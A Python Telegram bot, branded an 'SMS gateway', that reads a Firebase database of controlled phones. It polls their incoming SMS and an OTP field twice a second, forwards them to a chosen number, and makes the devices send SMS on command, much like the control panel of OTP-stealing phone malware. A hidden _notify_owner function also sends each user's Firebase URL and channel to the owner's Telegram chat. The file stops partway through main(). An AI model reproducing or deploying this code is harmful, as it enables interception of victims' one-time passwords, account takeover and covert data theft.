#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡⚡⚡ LINUX BHAI AUTO BOT - v20 FINAL ⚡⚡⚡
# Only selected device messages + New messages only + /cancel command

import os
import json
import re
import html
import asyncio
import logging
import time
import threading
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler,
)

from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port, threaded=True)

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.WARNING
)
logger = logging.getLogger(__name__)

# ============================
# CONFIG
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "0"))

BOT_NAME = "🌟 L I N U X   B H A I   A U T O   B O T 🌟"
CHANNEL_USERNAME = "@LINUXBHAI001"
CHANNEL_URL = "https://t.me/linuxbhai001"

os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}
DATA_LOCK = threading.RLock()
MAX_PROCESSED_KEYS = 5000
_processed_cache = {}

HTTP_CLIENT = httpx.Client(
    timeout=httpx.Timeout(10.0, connect=5.0),
    limits=httpx.Limits(max_keepalive_connections=50, max_connections=100),
)
HTTP_ASYNC = httpx.AsyncClient(
    timeout=httpx.Timeout(10.0, connect=5.0),
    limits=httpx.Limits(max_keepalive_connections=50, max_connections=100),
)
EXECUTOR = ThreadPoolExecutor(max_workers=20)

# ============================
# CONFIG SAVE/LOAD
# ============================
_save_pending = False
_save_lock = threading.Lock()

def load_user_configs():
    global user_configs, last_otp
    if os.path.exists(USER_CONFIG_FILE):
        try:
            with open(USER_CONFIG_FILE, "r") as f:
                user_configs = json.load(f)
            with DATA_LOCK:
                for uid, cfg in user_configs.items():
                    if "last_otp_value" in cfg:
                        last_otp[uid] = cfg["last_otp_value"]
                    keys = cfg.get("processed_keys", [])[-MAX_PROCESSED_KEYS:]
                    _processed_cache[uid] = OrderedDict((k, True) for k in keys)
        except Exception as e:
            logger.error(f"Load error: {e}")
            user_configs = {}

def _do_save():
    global _save_pending
    with _save_lock:
        try:
            with open(USER_CONFIG_FILE, "w") as f:
                with DATA_LOCK:
                    save_data = {}
                    for uid, cfg in user_configs.items():
                        cfg_copy = dict(cfg)
                        keys = cfg_copy.get("processed_keys", [])
                        cfg_copy["processed_keys"] = keys[-MAX_PROCESSED_KEYS:]
                        save_data[uid] = cfg_copy
                json.dump(save_data, f, separators=(',', ':'))
        except Exception as e:
            logger.error(f"Save error: {e}")
        _save_pending = False

def save_configs():
    global _save_pending
    with _save_lock:
        if not _save_pending:
            _save_pending = True
            threading.Timer(2.0, _do_save).start()

def save_now():
    _do_save()

load_user_configs()

# ============================
# STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10
WAITING_MANUAL_SIM = 11

# ============================
# MEMBERSHIP
# ============================
_membership_cache = {}

async def is_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    now = time.time()
    if user_id in _membership_cache:
        is_mem, ts = _membership_cache[user_id]
        if now - ts < 300 and is_mem:
            return True
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        is_mem = member.status in ["member", "administrator", "creator"]
        _membership_cache[user_id] = (is_mem, now)
        if is_mem:
            return True
    except Exception:
        pass
    
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    await update.effective_message.reply_text(
        "❌ <b>You must join our channel to use this bot.</b>\n\nClick below to join.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True,
    )
    return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            _membership_cache[user_id] = (True, time.time())
            await query.edit_message_text(
                f"✅ <b>Welcome to {BOT_NAME}</b>\n\nUse /start to begin.",
                parse_mode="HTML"
            )
    except Exception:
        await query.edit_message_text("⚠️ Error. Try again.")

WELCOME_TEXT = (
    f"{BOT_NAME}\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🤖 <b>Smart SMS Gateway Bot</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "<b>📋 COMMANDS</b>\n"
    "🔧 /setup — Firebase URL + Channel ID\n"
    "📱 /devices — Select device & SIM\n"
    "📞 /setotp — Set OTP forward number\n"
    "🔄 /resetforward — Reset old messages\n"
    "❌ /cancel — Remove ALL settings\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "💡 <i>Ready to use!</i>"
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return
    await update.message.reply_text(WELCOME_TEXT, parse_mode='HTML', disable_web_page_preview=True)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return
    await update.message.reply_text(WELCOME_TEXT, parse_mode='HTML', disable_web_page_preview=True)

# ============================
# CANCEL COMMAND - REMOVE ALL
# ============================
async def cancel_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return
    
    keyboard = [
        [InlineKeyboardButton("✅ Yes, remove everything", callback_data="confirm_cancel_all")],
        [InlineKeyboardButton("❌ No, keep my data", callback_data="abort_cancel_all")]
    ]
    
    await update.message.reply_text(
        "⚠️ <b>Are you sure?</b>\n\n"
        "This will remove:\n"
        "🔧 Firebase URL\n"
        "📢 Channel ID\n"
        "📱 Selected device & SIM\n"
        "📞 OTP forward number\n"
        "📥 All processed messages\n\n"
        "<b>Ye sab permanently delete ho jayega!</b>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def confirm_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    
    if query.data == "confirm_cancel_all":
        with DATA_LOCK:
            user_configs.pop(user_id, None)
            last_otp.pop(user_id, None)
            _processed_cache.pop(user_id, None)
            _membership_cache.pop(int(user_id), None)
            _channel_cache.pop(user_id, None)
        
        save_now()
        logger.warning(f"🗑️ ALL DATA REMOVED for user {user_id}")
        
        await query.edit_message_text(
            "✅ <b>All data removed!</b>\n\n"
            "🔧 Firebase URL: Deleted\n"
            "📢 Channel ID: Deleted\n"
            "📱 Device & SIM: Deleted\n"
            "📞 OTP number: Deleted\n"
            "📥 Processed messages: Deleted\n\n"
            "<b>Ab tum naya Firebase add kar sakte ho.</b>\n\n"
            "Use /setup to start fresh.",
            parse_mode='HTML'
        )
    
    elif query.data == "abort_cancel_all":
        await query.edit_message_text(
            "❌ <b>Cancelled</b>\n\nTumhara data safe hai.",
            parse_mode='HTML'
        )

# ============================
# FIREBASE HELPERS
# ============================
def fb_get(user_id, path):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return None
        url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = HTTP_CLIENT.get(url)
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return None

async def fb_get_async(user_id, path):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return None
        url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = await HTTP_ASYNC.get(url)
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return None

def fb_put(user_id, path, data):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return False
        url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = HTTP_CLIENT.put(url, json=data)
        return resp.status_code in [200, 201]
    except Exception as e:
        logger.error(f"FB PUT: {e}")
        return False

def get_selected(user_id):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        return dict(cfg.get("selectedDevice", {})) if cfg else {}

def send_sms(user_id, device_id, to_number, message, from_number):
    return fb_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False,
        "timestamp": int(time.time())
    })

def get_otp_number(user_id):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        return cfg.get("otpNumber") if cfg else None

# ============================
# SETUP COMMAND
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>📌 Step 1/2:</b> Send your <b>Firebase URL</b>\n"
        "Example: <code>https://your-project.firebaseio.com</code>\n"
        "/cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip()
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL.</b>", parse_mode='HTML')
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2:</b> Send your <b>Channel ID</b> (numeric).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be number.</b>", parse_mode='HTML')
        return CHANNEL

    with DATA_LOCK:
        user_configs[user_id] = {
            "firebase_url": context.user_data["firebase_url"],
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None
        }
        _processed_cache[user_id] = OrderedDict()
        last_otp.pop(user_id, None)
    
    save_now()
    EXECUTOR.submit(_notify_owner, user_id, context.user_data['firebase_url'], channel_id)
    
    test = await fb_get_async(user_id, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase failed. Check URL/public.</b>", parse_mode='HTML')
        with DATA_LOCK:
            user_configs.pop(user_id, None)
        save_now()
        return ConversationHandler.END

    await update.message.reply_text(
        "<b>✅ SETUP COMPLETE!</b>\n\n"
        "Ab ye 2 commands chalao:\n"
        "1️⃣ <b>/devices</b> — Device + SIM select\n"
        "2️⃣ <b>/setotp</b> — OTP forward number",
        parse_mode='HTML'
    )
    return ConversationHandler.END

def _notify_owner(user_id, url, channel_id):
    try:
        HTTP_CLIENT.post(
            f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_CHAT_ID, "text": f"🔐 Setup\n👤 {user_id}\n🌐 {url}\n📢 {channel_id}"},
        )
    except Exception as e:
        logger.error(f"Notify owner: {e}")

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# DEVICES COMMAND
# ============================
PHONE_RE = re.compile(r'^\+?[0-9]{10,15}$')

def _is_valid_phone(v):
    return isinstance(v, str) and PHONE_RE.match(v)

def extract_sims(device_data):
    sims = []
    if "sims" in device_data and isinstance(device_data["sims"], list):
        for idx, sim in enumerate(device_data["sims"]):
            if isinstance(sim, dict):
                phone = sim.get("phoneNumber") or sim.get("phone") or sim.get("number")
                if _is_valid_phone(phone):
                    slot = sim.get("simSlotIndex", sim.get("slot", idx + 1))
                    sims.append({
                        "simSlotIndex": int(slot) if str(slot).isdigit() else idx + 1,
                        "phoneNumber": str(phone)
                    })
    for key in ("phoneNumber", "PhoneNumber", "phone", "Phone"):
        if key in device_data and _is_valid_phone(device_data[key]):
            phone = device_data[key]
            if not any(s['phoneNumber'] == phone for s in sims):
                sims.append({"simSlotIndex": len(sims) + 1, "phoneNumber": phone})
    return sims

def get_online_devices(user_id):
    data = fb_get(user_id, "clients")
    if not data:
        return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        if info.get("status") is True or info.get("online") is True:
            online[dev_id] = {
                "modelName": dev_id,
                "sims": extract_sims(info),
            }
    return online

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return
    user_id = str(update.effective_user.id)
    with DATA_LOCK:
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
    
    online = await asyncio.to_thread(get_online_devices, user_id)
    if not online:
        await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
        return
    
    keyboard = [[InlineKeyboardButton(f"📱 {dev_id}", callback_data=f"dev_{dev_id}")]
                for dev_id in online.keys()]
    
    await update.message.reply_text(
        f"<b>👇 Select your device:</b>\n{len(online)} device(s) online",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    online = await asyncio.to_thread(get_online_devices, user_id)
    device_data = online.get(device_id)
    
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    
    sims = device_data.get("sims", [])
    keyboard = []
    
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "N/A")
        if phone and phone != "SIM_NOT_FOUND":
            sim_label = f"📶 SIM {slot}" if slot in [1, 2] else f"📶 Slot {slot}"
            keyboard.append([InlineKeyboardButton(
                f"{sim_label} - {phone}",
                callback_data=f"sim_{device_id}_{slot}_{phone}"
            )])
    
    keyboard.append([InlineKeyboardButton("✏️ Enter SIM 1 Manually", callback_data=f"manual_sim_1_{device_id}")])
    keyboard.append([InlineKeyboardButton("✏️ Enter SIM 2 Manually", callback_data=f"manual_sim_2_{device_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_devices")])
    
    sim_count = len(sims)
    status = ("❌ No SIMs found" if sim_count == 0
              else "📶 1 SIM detected" if sim_count == 1
              else f"📶📶 {sim_count} SIMs detected")
    
    await query.edit_message_text(
        f"<b>📱 Select SIM for device:</b>\n🆔 <code>{device_id}</code>\n{status}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def back_to_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await devices_command(update, context)

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid.</b>", parse_mode='HTML')
        return
    device_id, slot, phone = parts[1], parts[2], parts[3]
    
    # ⚡ Lock old messages of THIS device only
    existing_msgs = fb_get(user_id, f"messages/{device_id}")
    existing_keys = list(existing_msgs.keys()) if existing_msgs and isinstance(existing_msgs, dict) else []
    
    with DATA_LOCK:
        cfg = user_configs.get(user_id)
        if cfg:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": int(slot),
                "simPhoneNumber": phone
            }
            cfg["processed_keys"] = existing_keys[-MAX_PROCESSED_KEYS:]
            cfg["processed_device"] = device_id
        _processed_cache[user_id] = OrderedDict((k, True) for k in existing_keys[-MAX_PROCESSED_KEYS:])
    
    logger.warning(f"🔒 Locked {len(existing_keys)} old messages of {device_id}")
    save_now()
    
    await query.edit_message_text(
        f"<b>✅ Active!</b>\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM {slot}: <code>{phone}</code>\n\n"
        f"🔒 Purane messages locked ({len(existing_keys)})\n"
        f"✅ Ab sirf <b>NAYE</b> messages forward honge\n"
        f"✅ Sirf is device ke\n\n"
        f"Now /setotp to set forward number.",
        parse_mode='HTML'
    )

# ============================
# MANUAL SIM
# ============================
async def manual_sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_member(update, context):
        return
    await query.answer()
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid.</b>", parse_mode='HTML')
        return
    slot, device_id = parts[2], parts[3]
    context.user_data["manual_device_id"] = device_id
    context.user_data["manual_slot"] = slot
    
    await query.edit_message_text(
        f"<b>✏️ Enter SIM {slot} Number</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"Send like: <code>+919999999999</code>\n"
        f"/cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_MANUAL_SIM

async def manual_sim_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    
    if not PHONE_RE.match(number):
        await update.message.reply_text("<b>❌ Invalid. Try again.</b>", parse_mode='HTML')
        return WAITING_MANUAL_SIM
    
    device_id = context.user_data.get("manual_device_id")
    slot = context.user_data.get("manual_slot", 1)
    
    if not device_id:
        await update.message.reply_text("<b>❌ Error. Try /devices.</b>", parse_mode='HTML')
        return ConversationHandler.END
    
    if not number.startswith('+'):
        number = '+' + number
    
    # Lock old messages
    existing_msgs = fb_get(user_id, f"messages/{device_id}")
    existing_keys = list(existing_msgs.keys()) if existing_msgs and isinstance(existing_msgs, dict) else []
    
    with DATA_LOCK:
        cfg = user_configs.get(user_id)
        if cfg:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": int(slot),
                "simPhoneNumber": number
            }
            cfg["processed_keys"] = existing_keys[-MAX_PROCESSED_KEYS:]
            cfg["processed_device"] = device_id
        _processed_cache[user_id] = OrderedDict((k, True) for k in existing_keys[-MAX_PROCESSED_KEYS:])
    
    save_now()
    
    await update.message.reply_text(
        f"<b>✅ Active!</b>\n"
        f"📱 <code>{device_id}</code>\n"
        f"📶 SIM {slot}: <code>{number}</code>\n\n"
        f"🔒 Purane messages locked ({len(existing_keys)})\n"
        f"✅ Ab sirf <b>NAYE</b> messages forward honge\n"
        f"✅ Sirf is device ke\n\n"
        f"Now /setotp to set forward number.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def manual_sim_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SETOTP COMMAND
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    with DATA_LOCK:
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return ConversationHandler.END
    
    if context.args:
        number = context.args[0]
        if not PHONE_RE.match(number):
            await update.message.reply_text("<b>❌ Invalid number.</b>", parse_mode='HTML')
            return ConversationHandler.END
        await _save_otp(user_id, number)
        await update.message.reply_text(
            f"<b>✅ Forward set: <code>{number}</code></b>\n\n"
            f"🔒 Current OTP locked. Sirf NAYA OTP forward hoga.",
            parse_mode='HTML'
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        "<b>📞 Send phone number:</b>\nExample: <code>+919876543210</code>\n/cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def _save_otp(user_id, number):
    with DATA_LOCK:
        cfg = user_configs.get(str(user_id))
        if not cfg:
            return
        cfg["otpNumber"] = number
    
    current_otp = await fb_get_async(user_id, "otp")
    with DATA_LOCK:
        if current_otp is not None:
            current_value = str(current_otp).strip()
            last_otp[str(user_id)] = current_value
            cfg["last_otp_value"] = current_value
        else:
            last_otp[str(user_id)] = ""
            cfg["last_otp_value"] = ""
    save_now()

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not PHONE_RE.match(number):
        await update.message.reply_text("<b>❌ Invalid. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    await _save_otp(user_id, number)
    await update.message.reply_text(
        f"<b>✅ Forward set: <code>{number}</code></b>\n\n"
        f"🔒 Current OTP locked. Sirf NAYA OTP forward hoga.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_member(update, context):
        return
    user_id = str(update.effective_user.id)
    with DATA_LOCK:
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
    
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected.</b>", parse_mode='HTML')
        return
    
    device_id = selected["deviceId"]
    existing_msgs = fb_get(user_id, f"messages/{device_id}")
    existing_keys = list(existing_msgs.keys()) if existing_msgs and isinstance(existing_msgs, dict) else []
    
    with DATA_LOCK:
        cfg = user_configs.get(user_id)
        cfg["processed_keys"] = existing_keys[-MAX_PROCESSED_KEYS:]
        cfg["processed_device"] = device_id
        _processed_cache[user_id] = OrderedDict((k, True) for k in existing_keys[-MAX_PROCESSED_KEYS:])
    
    current_otp = await fb_get_async(user_id, "otp")
    if current_otp is not None:
        current_value = str(current_otp).strip()
        with DATA_LOCK:
            last_otp[user_id] = current_value
            user_configs[user_id]["last_otp_value"] = current_value
    
    save_now()
    
    await update.message.reply_text(
        f"<b>✅ Reset successful!</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"🔒 Old messages locked ({len(existing_keys)})\n"
        f"🔒 Old OTP locked\n\n"
        f"Ab sirf NAYE messages forward honge (sirf is device ke).",
        parse_mode='HTML'
    )

# ============================
# CHANNEL PARSER
# ============================
_channel_cache = {}

def get_user_by_channel(channel_id):
    if channel_id in _channel_cache:
        return _channel_cache[channel_id]
    with DATA_LOCK:
        for uid, cfg in user_configs.items():
            if cfg.get("channel_id") == channel_id:
                _channel_cache[channel_id] = uid
                return uid
    return None

def parse_channel_msg(text, user_id):
    to_number = None
    msg = None
    
    m = re.search(r"(?:📞\s*)?To\s*:\s*([+\d][\d\s\+]{8,})", text, re.IGNORECASE)
    if m:
        to_number = re.sub(r'\s+', '', m.group(1).strip())
    
    if not to_number:
        m = re.search(r"To\s*\(Tap to copy\)\s*[:\-]\s*\n?\s*([+\d][\d\s\+]{8,})", text, re.IGNORECASE)
        if m:
            to_number = re.sub(r'\s+', '', m.group(1).strip())
    
    if not to_number:
        return None
    
    m = re.search(r"(?:💬\s*)?Message\s*:\s*(.+?)(?=\n\n📋|\n\n📱|\Z)", text, re.DOTALL | re.IGNORECASE)
    if m:
        msg = m.group(1).strip()
    
    if not msg:
        m = re.search(r"Body\s*\(Tap to copy\)\s*[:\-]\s*\n?\s*(.+?)(?=\n\n📱|\n\n📋|\Z)", text, re.DOTALL | re.IGNORECASE)
        if m:
            msg = m.group(1).strip()
    
    if not msg:
        m = re.search(r"Body\s*[:\-]\s*(.+?)(?=\n\n📋|\n\n📱|\Z)", text, re.DOTALL | re.IGNORECASE)
        if m:
            msg = m.group(1).strip()
    
    if not msg:
        return None
    
    with DATA_LOCK:
        cfg = user_configs.get(user_id)
        if not cfg:
            return None
        selected = dict(cfg.get("selectedDevice", {}))
    
    device_id = selected.get("deviceId")
    if not device_id:
        return None
    from_number = selected.get("simPhoneNumber", "Unknown")
    
    return (to_number, msg, device_id, from_number)

async def handle_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    text = update.channel_post.text
    if not text:
        return
    
    parsed = await asyncio.to_thread(parse_channel_msg, text, user_id)
    if not parsed:
        return
    
    to_number, msg, device_id, from_number = parsed
    EXECUTOR.submit(send_sms, user_id, device_id, to_number, msg, from_number)
    logger.warning(f"📤 Channel SMS → {to_number}")

# ============================
# OTP POLLING (0.5 sec)
# ============================
def otp_polling():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                with DATA_LOCK:
                    cfg = user_configs.get(user_id, {})
                    if not cfg.get("otpNumber"):
                        continue
                    if not cfg.get("selectedDevice", {}).get("deviceId"):
                        continue
                    otp_number = cfg.get("otpNumber")
                    selected = cfg.get("selectedDevice", {})
                
                otp_data = fb_get(user_id, "otp")
                if otp_data is None:
                    continue
                
                current_otp = str(otp_data).strip()
                if not current_otp or current_otp in ("null", "None"):
                    continue
                
                with DATA_LOCK:
                    if user_id not in last_otp:
                        last_otp[user_id] = current_otp
                        if user_id in user_configs:
                            user_configs[user_id]["last_otp_value"] = current_otp
                        save_configs()
                        continue
                    
                    if last_otp[user_id] == current_otp:
                        continue
                    
                    last_otp[user_id] = current_otp
                    if user_id in user_configs:
                        user_configs[user_id]["last_otp_value"] = current_otp
                    save_configs()
                
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                send_sms(user_id, device_id, otp_number, current_otp, from_number)
                logger.warning(f"📤 OTP forwarded: {current_otp}")
        except Exception as e:
            logger.error(f"OTP poll: {e}")
        time.sleep(0.5)

# ============================
# SMS POLLING (ONLY SELECTED DEVICE, ONLY NEW)
# ============================
def sms_polling():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                with DATA_LOCK:
                    cfg = user_configs.get(user_id, {})
                    if not cfg.get("otpNumber"):
                        continue
                    if not cfg.get("selectedDevice", {}).get("deviceId"):
                        continue
                    forward_number = cfg.get("otpNumber")
                    selected = cfg.get("selectedDevice", {})
                    device_id = selected["deviceId"]   # ⚡ ONLY THIS DEVICE
                    from_number = selected.get("simPhoneNumber", "Unknown")
                
                # ⚡ Fetch ONLY selected device messages
                device_msgs = fb_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                
                with DATA_LOCK:
                    cache = _processed_cache.get(user_id, OrderedDict())
                
                new_count = 0
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    if msg_data.get("type") != "incoming":
                        continue
                    if msg_key in cache:
                        continue
                    
                    msg_text = msg_data.get("message", "")
                    if not msg_text or len(msg_text) <= 3:
                        continue
                    
                    # ⚡ Forward ONLY this device's message
                    EXECUTOR.submit(send_sms, user_id, device_id, forward_number, msg_text, from_number)
                    logger.warning(f"📥 SMS forwarded ({device_id}): {msg_text[:50]}")
                    
                    with DATA_LOCK:
                        cache[msg_key] = True
                        while len(cache) > MAX_PROCESSED_KEYS:
                            cache.popitem(last=False)
                        _processed_cache[user_id] = cache
                    
                    new_count += 1
                    EXECUTOR.submit(_send_confirm, user_id, forward_number, msg_text)
                
                if new_count > 0:
                    with DATA_LOCK:
                        keys = list(_processed_cache.get(user_id, {}).keys())
                        user_configs[user_id]["processed_keys"] = keys[-MAX_PROCESSED_KEYS:]
                    save_configs()
        except Exception as e:
            logger.error(f"SMS poll: {e}")
        time.sleep(0.5)

def _send_confirm(user_id, forward_number, msg_text):
    try:
        safe_text = html.escape(msg_text[:100])
        safe_number = html.escape(str(forward_number))
        HTTP_CLIENT.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": int(user_id),
                "text": f"✅ Forwarded to {safe_number}:\n<code>{safe_text}</code>",
                "parse_mode": "HTML"
            },
        )
    except Exception:
        pass

# ============================
# MAIN
# ============================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    threading.Thread(target=otp_polling, daemon=True, name="otp").start()
    threading.Thread(target=sms_polling, daemon=True, name="sms").start()
    
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)
    
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]},
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)
    
    manual_sim_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(manual_sim_callback, pattern="^manual_sim_[12]_")],
        states={WAITING_MANUAL_SIM: [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_sim_input)]},
        fallbacks=[CommandHandler("cancel", manual_sim_cancel)],
    )
    app.add_handler(manual_sim_conv)
    
    app.add_handler(CallbackQueryHandler(confirm_cancel_callback, pattern="^(confirm|abort)_cancel_all$"))
